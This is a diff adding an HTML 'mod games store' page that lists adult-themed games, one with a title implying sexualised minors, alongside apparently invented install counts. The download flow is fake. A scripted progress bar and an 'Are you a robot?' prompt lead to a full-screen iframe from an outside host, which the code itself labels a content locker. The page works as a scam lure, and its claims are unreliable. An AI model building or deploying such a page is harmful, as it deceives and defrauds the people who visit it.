@@ -1,1 +1,527 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>gemko Mod Games Store</title>
+<style>
+:root {
+  --bg: #000000;
+  --card: #1a1a1f;
+  --muted: #a1a1aa;
+  --text: #fff;
+  --primary: #ff2d75;
+  --primaryHover: #ff4687;
+  --border: #2c2c34;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--text);}
+.container{max-width:1000px;margin:0 auto;padding:20px}
 
+/* header */
+.app-header{text-align:center;margin-bottom:5px}
+.app-header img{width:240px;height:auto;margin-bottom:5px}
+.app-header h1{font-size:10px;color:var(--text)}
+
+/* search */
+.search-box{margin-bottom:20px}
+.search-box input{
+  width:100%;
+  padding:12px 15px;
+  border-radius:10px;
+  border:1px solid var(--border);
+  background:var(--card);
+  color:var(--text);
+  font-size:14px;
+}
+
+/* section */
+.section h2{font-size:20px;color:var(--primary);margin-bottom:15px;font-weight:700}
+
+/* game cards */
+.grid{display:grid;grid-template-columns:1fr;gap:15px}
+@media(min-width:600px){.grid{grid-template-columns:repeat(2,1fr)}}
+.card{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:15px;
+  display:flex;
+  flex-direction:column;
+  gap:12px;
+}
+.card-header{display:flex;align-items:center;gap:12px}
+.card-header img{width:60px;height:60px;border-radius:12px;object-fit:cover}
+.card-title{font-weight:700;font-size:16px}
+.card-sub{font-size:13px;color:var(--muted)}
+
+/* platform chips */
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chip{
+  padding:4px 10px;
+  border-radius:999px;
+  font-size:12px;
+  background:#2c2c34;
+  color:var(--text);
+}
+.chip.android{background:#3ddc84;color:#000}
+.chip.ios{background:#fff;color:#000}
+.chip.pc{background:#0078d7;color:#fff}
+
+/* button */
+.btn{
+  padding:12px;
+  border:none;
+  border-radius:30px;
+  font-size:14px;
+  font-weight:600;
+  text-align:center;
+  cursor:pointer;
+  transition:0.2s;
+  background:var(--primary);
+  color:#fff;
+  width:100%;
+}
+.btn:hover{background:var(--primaryHover)}
+
+/* dialogs */
+dialog{
+  border:none;
+  border-radius:12px;
+  padding:20px;
+  background:var(--card);
+  color:var(--text);
+  max-width:320px;
+  width:90%;
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%, -50%);
+}
+dialog::backdrop{background:rgba(0,0,0,0.6)}
+</style>
+<style>
+      .copy-protection-on #single-article-right,
+      .copy-protection-on {
+        pointer-events: initial !important;
+      }
+      ::-moz-selection {
+        color: #000 !important;
+        background: #accef7 !important;
+      }
+      ::selection {
+        color: #000 !important;
+        background: #accef7 !important;
+      }
+
+      @layer allow-right-click {
+        ::-moz-selection {
+          color: #000 !important;
+          background: #accef7 !important;
+        }
+        ::selection {
+          color: #000 !important;
+          background: #accef7 !important;
+        }
+      }
+    </style>
+</head>
+<body>
+<div class="container">
+
+  <!-- header -->
+  <div class="app-header">
+    <img src="https://i.postimg.cc/2j0LLxXX/1c94af3e-f616-46c4-8028-141b6222d765.jpg" alt="Logo" style="pointer-events: all !important;">
+    <h1></h1>
+  </div>
+
+  <!-- search -->
+  <div class="search-box">
+    <input type="text" placeholder="Search games..." oninput="searchGames(this.value)">
+  </div>
+
+  <!-- games -->
+  <div class="section">
+    <h2>Featured Games</h2>
+    <div class="grid" id="grid">
+    <article class="card">
+      <div class="card-header">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDHhnyhG7dho-THiKfubb3WbqxaPYbPfq4Fg&amp;s" alt="Helix waltz" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Helix waltz</div>
+          <div class="card-sub">v3.4.7 • +500M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://c754e21d1d.mjedge.net/data/resource_icons/47/47953.jpg?1719042680" alt="3D Girls" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">3D Girls</div>
+          <div class="card-sub">v3.2.1 • +250M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://media.cdnandroid.com/item_images/1379440/imagen-tag-after-school-0ori.jpg" alt="Kaori After Story" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Kaori After Story</div>
+          <div class="card-sub">v 3.51.1 • +500M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://m.media-amazon.com/images/I/618EMIg5zXL._UXNaN_FMjpg_QL85_.jpg" alt="Girls Fighter DP" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Girls Fighter DP</div>
+          <div class="card-sub">v7.9.5 • +100M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://www.dolldivine.com/meiker/anime-girl-tpng/assets/456/2020/06/icon_202006251755195ef4e507d8f74.png" alt="Anime Girl Dress Up" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Anime Girl Dress Up</div>
+          <div class="card-sub">v3.4.7 • +450M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://th.bing.com/th/id/R.d89e07f38dc951540f6322bc4c754550?rik=2xp7mhXA%2fRyt7g&amp;riu=http%3a%2f%2fpic.danji100.com%2fupload%2f2023-9%2f202396115487418.png&amp;ehk=T3IcGHaD%2fHW52T49k3qfrI%2fLxLCmRaN3UVee7bxmeGY%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="Watashi No Loli" style="display: none !important; pointer-events: all !important;">
+        <div>
+          <div class="card-title">Watashi No Loli</div>
+          <div class="card-sub">v1.28.3 • +50M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://apkloo.io/wp-content/uploads/2023/06/Project-GLUTT-APK.png" alt="Project JBL2" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Project JBL2</div>
+          <div class="card-sub">v1.25.1 • +100M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://cdn.donmai.us/original/a3/6f/a36f095c6e139eec2a8c1c27b2dafc39.jpg" alt="College Perfect Match" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">College Perfect Match</div>
+          <div class="card-sub">v2.29.0 • +100M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/6TsxmT4q/photo-5936006675997771714-y.jpg" alt="Oreno Waifu" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Oreno Waifu</div>
+          <div class="card-sub">v1.8.9 • +100M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/15685qHW/photo-5936006675997771717-y.jpg" alt="Hotel spirit girl" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Hotel spirit girl</div>
+          <div class="card-sub">v1.4.7 • +500M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/g00cRXVb/photo-5936006675997771718-y.jpg" alt="MF mobile MOD" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">MF mobile MOD</div>
+          <div class="card-sub">v1.4.7 • +500M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/BnSJ9LwP/photo-5936006675997771711-y.jpg" alt="Miss Kimiko" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Miss Kimiko</div>
+          <div class="card-sub">v5.1.4 • +400M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/1zghsp0X/photo-5936006675997771712-x.jpg" alt="Big night brother" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Big night brother</div>
+          <div class="card-sub">v1.309.1 • +500M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/1RrTxCxM/photo-5936006675997771713-y.jpg" alt="Holms Girls" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Holms Girls</div>
+          <div class="card-sub">v0.375.1 • +500M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/4dV3NCvY/photo-5936006675997771716-y.jpg" alt="Lust house" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Lust house</div>
+          <div class="card-sub">v1.27.10 • +50M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  
+    <article class="card">
+      <div class="card-header">
+        <img src="https://i.postimg.cc/dVsZH024/photo-5936006675997771715-y.jpg" alt="Hole House" style="pointer-events: all !important;">
+        <div>
+          <div class="card-title">Hole House</div>
+          <div class="card-sub">v1.0.307 • +50M installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  </div>
+  </div>
+</div>
+
+<!-- device modal -->
+<dialog id="deviceModal">
+  <h3>Select your device</h3>
+  <div style="margin-top:15px;display:flex;gap:10px;flex-wrap:wrap;">
+    <button class="btn primary" onclick="startDownload('ios')">IOS</button>
+    <button class="btn primary" onclick="startDownload('android')">ANDROID</button>
+  </div>
+  <div style="margin-top:15px;text-align:right">
+    <button class="btn" onclick="deviceModal.close()">Close</button>
+  </div>
+</dialog>
+
+<!-- loading modal -->
+<dialog id="loadingModal">
+  <h3 id="loadingText">Downloading</h3>
+  <div style="margin-top:15px;width:100%;background:#111623;border-radius:8px;overflow:hidden;">
+    <div id="progress" style="width:0%;height:12px;background:var(--primary);transition:width 0.3s;"></div>
+  </div>
+</dialog>
+
+<script>
+const items = [
+  {title:'Helix waltz', latest:'3.4.7', installs:'+500M', rating:'5', img:'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDHhnyhG7dho-THiKfubb3WbqxaPYbPfq4Fg&s'},
+  {title:'3D Girls', latest:'3.2.1', installs:'+250M', rating:'4.7',  img:'https://c754e21d1d.mjedge.net/data/resource_icons/47/47953.jpg?1719042680'},
+  {title:'Kaori After Story', latest:' 3.51.1', installs:'+500M', rating:'4.6', img:'https://media.cdnandroid.com/item_images/1379440/imagen-tag-after-school-0ori.jpg'},
+  {title:'Girls Fighter DP', latest:'7.9.5', installs:'+100M', rating:'4.3', img:'https://m.media-amazon.com/images/I/618EMIg5zXL._UXNaN_FMjpg_QL85_.jpg'},
+  {title:'Anime Girl Dress Up', latest:'3.4.7', installs:'+450M', rating:'4.6', img:'https://www.dolldivine.com/meiker/anime-girl-tpng/assets/456/2020/06/icon_202006251755195ef4e507d8f74.png'},
+  {title:'Watashi No Loli', latest:'1.28.3', installs:'+50M', rating:'5', img:'https://th.bing.com/th/id/R.d89e07f38dc951540f6322bc4c754550?rik=2xp7mhXA%2fRyt7g&riu=http%3a%2f%2fpic.danji100.com%2fupload%2f2023-9%2f202396115487418.png&ehk=T3IcGHaD%2fHW52T49k3qfrI%2fLxLCmRaN3UVee7bxmeGY%3d&risl=&pid=ImgRaw&r=0'},
+  {title:'Project JBL2', latest:'1.25.1', installs:'+100M', rating:'4.5', img:'https://apkloo.io/wp-content/uploads/2023/06/Project-GLUTT-APK.png'},
+  {title:'College Perfect Match', latest:'2.29.0', installs:'+100M', rating:'4.4', img:'https://cdn.donmai.us/original/a3/6f/a36f095c6e139eec2a8c1c27b2dafc39.jpg'},
+  {title:'Oreno Waifu', latest:'1.8.9', installs:'+100M', rating:'4.8', img:'https://i.postimg.cc/6TsxmT4q/photo-5936006675997771714-y.jpg'},
+  {title:'Hotel spirit girl', latest:'1.4.7', installs:'+500M', rating:'5', img:'https://i.postimg.cc/15685qHW/photo-5936006675997771717-y.jpg'},
+  {title:'MF mobile MOD', latest:'1.4.7', installs:'+500M', rating:'4.9', img:'https://i.postimg.cc/g00cRXVb/photo-5936006675997771718-y.jpg'},
+  {title:'Miss Kimiko', latest:'5.1.4', installs:'+400M', rating:'4.8', img:'https://i.postimg.cc/BnSJ9LwP/photo-5936006675997771711-y.jpg'},
+  {title:'Big night brother', latest:'1.309.1', installs:'+500M', rating:'5', img:'https://i.postimg.cc/1zghsp0X/photo-5936006675997771712-x.jpg'},
+  {title:'Holms Girls', latest:'0.375.1', installs:'+500M', rating:'4.1', img:'https://i.postimg.cc/1RrTxCxM/photo-5936006675997771713-y.jpg'},
+  {title:'Lust house', latest:'1.27.10', installs:'+50M', rating:'4.1', img:'https://i.postimg.cc/4dV3NCvY/photo-5936006675997771716-y.jpg'},
+  {title:'Hole House', latest:'1.0.307', installs:'+50M', rating:'4.7', img:'https://i.postimg.cc/dVsZH024/photo-5936006675997771715-y.jpg'}
+];
+const grid = document.getElementById('grid');
+function render(list){
+  grid.innerHTML = list.map(it=>`
+    <article class="card">
+      <div class="card-header">
+        <img src="${it.img}" alt="${it.title}">
+        <div>
+          <div class="card-title">${it.title}</div>
+          <div class="card-sub">v${it.latest} • ${it.installs} installs</div>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip android">Android</span>
+        <span class="chip ios">iOS</span>
+      </div>
+      <button class="btn" onclick="openDeviceModal()">Download Now</button>
+    </article>
+  `).join('');
+}
+render(items);
+
+function searchGames(q){
+  q = q.toLowerCase();
+  render(items.filter(it=>it.title.toLowerCase().includes(q)));
+}
+
+const deviceModal = document.getElementById('deviceModal');
+const loadingModal = document.getElementById('loadingModal');
+const progressBar = document.getElementById('progress');
+const loadingText = document.getElementById('loadingText');
+
+function openDeviceModal(){
+  deviceModal.showModal();
+}
+
+function startDownload(device){
+  deviceModal.close();
+  loadingModal.showModal();
+  progressBar.style.width = "0%";
+  loadingText.textContent = "Downloading";
+
+  let progress = 0;
+  const interval = setInterval(()=>{
+    progress += 20;
+    progressBar.style.width = progress+"%";
+
+    if(progress >= 50 && progress < 80){
+      loadingText.textContent = "Downloading finish";
+    } else if(progress >= 80){
+      loadingText.textContent = "Are you a robot?";
+    }
+
+    if(progress >= 100){
+      clearInterval(interval);
+      loadingModal.close();
+      // Show the new content locker
+      showContentLocker();
+    }
+  }, 800);
+}
+
+function showContentLocker() {
+  // Create iframe for the new content locker
+  const iframe = document.createElement('iframe');
+  iframe.src = 'https://gflick.xyz/cl/i/o4x23q';
+  iframe.style.position = 'fixed';
+  iframe.style.top = '0';
+  iframe.style.left = '0';
+  iframe.style.width = '100%';
+  iframe.style.height = '100%';
+  iframe.style.border = 'none';
+  iframe.style.zIndex = '9999';
+  iframe.style.background = '#fff';
+  
+  document.body.appendChild(iframe);
+  
+  // Add close button
+  const closeBtn = document.createElement('button');
+  closeBtn.textContent = 'X';
+  closeBtn.style.position = 'fixed';
+  closeBtn.style.top = '15px';
+  closeBtn.style.right = '15px';
+  closeBtn.style.zIndex = '10000';
+  closeBtn.style.background = 'red';
+  closeBtn.style.color = 'white';
+  closeBtn.style.border = 'none';
+  closeBtn.style.borderRadius = '50%';
+  closeBtn.style.width = '30px';
+  closeBtn.style.height = '30px';
+  closeBtn.style.cursor = 'pointer';
+  closeBtn.onclick = function() {
+    document.body.removeChild(iframe);
+    document.body.removeChild(closeBtn);
+  };
+  
+  document.body.appendChild(closeBtn);
+}
+</script>
+</body>
+</html>
